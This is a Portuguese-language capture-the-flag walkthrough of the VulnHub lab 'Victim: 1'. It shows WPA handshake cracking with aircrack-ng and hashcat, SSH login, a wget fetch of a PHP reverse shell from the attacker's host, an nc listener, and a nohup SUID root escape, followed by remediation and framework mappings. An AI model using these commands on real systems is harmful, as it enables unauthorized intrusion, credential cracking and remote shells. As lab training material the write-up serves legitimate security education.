# Victim: 1 — A Senha do WiFi Estava no Servidor Web o Tempo Todo

Mano, quem diria que uma máquina CTF hospedaria o arquivo de captura de WiFi no próprio servidor web público? Victim: 1 é uma cadeia criativa onde você baixa um handshake WPA do WordPress, quebra a chave WiFi com aircrack-ng, entra via SSH com o SSID como usuário, encontra um diretório web com permissão de escrita para todos, faz upload de uma reverse shell PHP, e sai como root porque o servidor web decidiu rodar como root. Design sensacional para ensinar abuso de credenciais WiFi num contexto realista. Valeu ao criador.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Victim: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/victim-1,555/ |
| **Técnicas** | Enumeração WordPress, download de captura WPA, aircrack-ng, login SSH, diretório web world-writable, upload PHP reverse shell, nohup SUID ou web server como root |
| **CVEs** | CWE-312 (captura WPA em servidor público), CWE-732 (diretório web world-writable), CWE-434 (upload e execução PHP), CWE-269 (web server rodando como root) |
| **Grupos APT** | APT41: usa coleta de credenciais de arquivos expostos publicamente para acesso inicial |

---

## Resumo do Ataque

```
nmap → SSH 22, HTTP 80, WordPress 8080, HTTP 9000
  → WordPress 8080: WPA-01.cap disponível para download
  → Wireshark: SSID = "dlink"
  → aircrack-ng + rockyou.txt → CHAVE ENCONTRADA: p4ssword
  → ssh dlink@ALVO (senha: p4ssword)
  → find / -writable -type d → /var/www/bolt/public/files (world-writable)
  → upload PHP reverse shell via wget no diretório gravável
  → acessar http://ALVO:8080/files/shell.php → callback nc
  → id: uid=0(root) (web server roda como root)
  → /root/flag.txt
```

---

## Metodologia

1. Scan completo de portas para enumerar todos os serviços HTTP
2. Enumeração WordPress: descobrir arquivo de captura WPA
3. Wireshark: extrair SSID como potencial usuário SSH
4. Quebrar handshake WPA com aircrack-ng e rockyou
5. Acesso SSH com credenciais WiFi (SSID como usuário, chave WPA como senha)
6. Enumerar diretórios com escrita pública no filesystem
7. Upload de reverse shell PHP no diretório gravável do web server
8. Disparar a shell via requisição HTTP
9. Acesso root: web server roda como root (ou nohup SUID)

---

## Passo 1 — Descoberta e Scan Completo de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
# Alvo: 192.168.1.104

nmap -p- -A 192.168.1.104
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.x
80/tcp   open  http     Apache httpd
8080/tcp open  http     WordPress
9000/tcp open  http     (serviço web adicional)
```

Múltiplos serviços HTTP em portas não-padrão. WordPress na 8080 é a principal superfície de ataque.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração WordPress e Download da Captura WPA

Acessar `http://192.168.1.104:8080`. O site WordPress hospeda um arquivo disponível para download na biblioteca de mídia:

```bash
wget http://192.168.1.104:8080/wp-content/uploads/WPA-01.cap
```

Abrir a captura no Wireshark:

```bash
wireshark WPA-01.cap
# Ou: tshark -r WPA-01.cap -Y "wlan.fc.type_subtype==0x08" -T fields -e wlan.ssid
```

O SSID embutido no handshake WPA é **"dlink"**. Em convenção de CTF (e ocasionalmente em ambientes reais), o nome do dispositivo ou SSID é usado como nome de usuário. Anotar para SSH.

**Nota real:** Testadores de intrusão regularmente encontram arquivos .cap e .pcap em servidores web durante avaliações de PMEs. Desenvolvedores às vezes fazem upload de capturas de diagnóstico de rede que contêm handshakes de autenticação.

**MITRE ATT&CK:** T1039 — Dados de Compartilhamento de Rede

---

## Passo 3 — Quebrar Handshake WPA com Aircrack-ng

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap
```

```
CHAVE ENCONTRADA! [ p4ssword ]
```

Para cobertura maior com GPU:

```bash
hcxpcapngtool -o hash.hc22000 WPA-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

**MITRE ATT&CK:** T1110.002 — Força Bruta: Quebra de Senha

---

## Passo 4 — Login SSH com Credenciais WiFi

```bash
ssh dlink@192.168.1.104
# Senha: p4ssword

id
# uid=1000(dlink)
```

Enumerar o sistema: diretórios home, permissões sudo, processos em execução.

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH

---

## Passo 5 — Enumerar Diretórios com Escrita Pública

```bash
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys
```

Saída inclui `/var/www/bolt/public/files`. Verificar:

```bash
ls -la /var/www/bolt/public/files
# drwxrwxrwx (world-writable, dono root)
```

Configuração crítica incorreta: qualquer usuário ou processo comprometido pode plantar código executável num diretório web world-writable.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 6 — Upload de PHP Reverse Shell

Preparar a shell na máquina atacante:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Editar: $ip = '192.168.1.ATACANTE'; $port = 4444;
python3 -m http.server 8000
```

No alvo como `dlink`:

```bash
cd /var/www/bolt/public/files
wget http://192.168.1.ATACANTE:8000/shell.php
```

Iniciar o listener:

```bash
# Atacante:
nc -lvnp 4444
```

Disparar a shell:

```bash
curl http://192.168.1.104:8080/files/shell.php
```

**MITRE ATT&CK:** T1190 — Explorar Aplicação de Face Pública; T1059.004 — Shell Unix

---

## Passo 7 — Acesso Root

A shell retorna como `root` porque o processo do web server roda como root:

```bash
id
# uid=0(root)
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. Sensacional demais!

**Alternativa via nohup SUID:**

```bash
find / -perm -4000 -type f 2>/dev/null | grep nohup
nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
id
# uid=0(root)
```

**MITRE ATT&CK:** T1548.001 — Mecanismo de Controle de Elevação: Setuid e Setgid

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Observações |
|---|---|---|---|
| SSID WiFi | dlink | WPA-01.cap (Wireshark) | Usado como usuário SSH |
| Chave WPA | p4ssword | aircrack-ng + rockyou | Usado como senha SSH |
| Credencial SSH | dlink:p4ssword | Quebra da captura WPA | Acesso inicial |
| Flag root | (varia por instância) | /root/flag.txt | Após RCE no web server |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | Arquivo de captura WPA no servidor web público | Desenvolvedores fazem upload de capturas de diagnóstico para servidores web; atacantes quebram handshakes WPA2 a partir deles | Nunca armazenar .cap/.pcap em servidores web; purgar após diagnósticos |
| 2 | SSID = reutilização de credencial como usuário | Nomes de dispositivos e SSIDs frequentemente espelham nomes de usuário; atacantes testam isso primeiro | Nunca reutilizar nomes de dispositivos, SSIDs ou hostnames como credenciais |
| 3 | Diretório web world-writable permite upload PHP | Qualquer usuário ou processo comprometido pode plantar código executável | `chmod 755` em diretórios web; desabilitar execução PHP em diretórios de upload |
| 4 | Web server rodando como root | Qualquer RCE no web server concede root imediatamente; elimina necessidade de privesc | Rodar web server como `www-data` ou usuário dedicado de baixo privilégio |
| 5 | WPA2 fraco quebrável por dicionário | Handshakes WPA2 capturados são quebráveis offline; "p4ssword" está no rockyou | Usar WPA3 ou senha aleatória de 20+ caracteres; rotacionar senhas WiFi regularmente |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Coleta | Dados de Compartilhamento de Rede | T1039 |
| Acesso a Credenciais | Acesso a Credenciais | Quebra de Senha | T1110.002 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Execução | Execução | Shell Unix | T1059.004 |
| Escalação de Privilégios | Escalação de Privilégios | Setuid e Setgid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. Remover captura WPA do servidor web: deletar WPA-01.cap; auditar todos os uploads
2. Rotacionar credenciais WiFi: trocar para senha aleatória de 20+ caracteres; considerar WPA3
3. Corrigir permissões do diretório web: `chmod 755 /var/www/bolt/public/files`; desabilitar PHP em diretórios de upload
4. Rodar web server como não-root: configurar Apache/Nginx para rodar como `www-data`
5. Auditar credenciais SSH: garantir que nenhuma senha derivada de nome de dispositivo ou SSID exista

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Auditar todos os arquivos web-acessíveis; identificar .cap/.pcap |
| Proteger | Controle de Acesso | Corrigir permissões de diretório web; rodar web server como não-root |
| Proteger | Segurança de Dados | Remover capturas WPA de servidores públicos |
| Detectar | Anomalias e Eventos | Monitorar criação inesperada de arquivos PHP em diretórios web |
| Responder | Planejamento de Resposta | Rotacionar credenciais WiFi/SSH; remover webshells |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Corrigir diretório web world-writable; menor acesso em todos os paths web |
| AC-6 | Menor Privilégio | Rodar web server como usuário de baixo privilégio |
| CM-7 | Menor Funcionalidade | Desabilitar execução PHP em diretórios de upload |
| IA-5 | Gestão de Autenticadores | Rotacionar senhas WiFi/SSH; migrar para WPA3 |
| SC-28 | Proteção em Repouso | Nunca armazenar capturas WPA ou material de credencial em servidores web |

### CISA KEV

O diretório web world-writable com execução PHP mapeia para padrões descritos na orientação CISA sobre implantação de webshells (AA21-008A).

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL2 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL2 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (web server não-root; PHP desabilitado em uploads)
- **D3-OAM** — Gestão Administrativa do SO (hardening de permissões de diretório)

---

## Considerações Finais

Victim: 1 é uma máquina compacta e bem projetada que ensina um vetor de ataque subestimado: extrair credenciais de capturas de rede encontradas em servidores web. Em engajamentos reais, esse cenário exato aparece: desenvolvedor faz upload de captura de diagnóstico para uma pasta web compartilhada, atacante baixa, quebra o handshake WPA2, e pivota para a rede interna com credenciais WiFi válidas.

O web server rodando como root é a cereja no topo: um único upload de PHP concede root sem necessidade de escalonamento de privilégios. Ambas as descobertas são "não vão corrigir" em muitas organizações pequenas porque são problemas de configuração, não CVEs, e portanto invisíveis para scanners que verificam apenas software desatualizado.

Thanks guys!! (❍ᴥ❍ʋ)
